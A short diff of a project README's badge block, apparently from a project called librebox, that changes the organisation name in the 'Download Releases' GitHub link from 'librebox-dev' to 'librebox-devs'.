@@ -3,7 +3,7 @@
   <a href="https://discord.gg/PsYPR9b5" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/Discord-5865F2?logo=discord&logoColor=white&style=for-the-badge" alt="Discord"/>
   </a>
-  <a href="https://github.com/librebox-dev/librebox-demo/releases" style="text-decoration:none;">
+  <a href="https://github.com/librebox-devs/librebox-demo/releases" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/Download_Releases-000000?logo=github&logoColor=white&style=for-the-badge" alt="Download Releases"/>
   </a>
 </div>
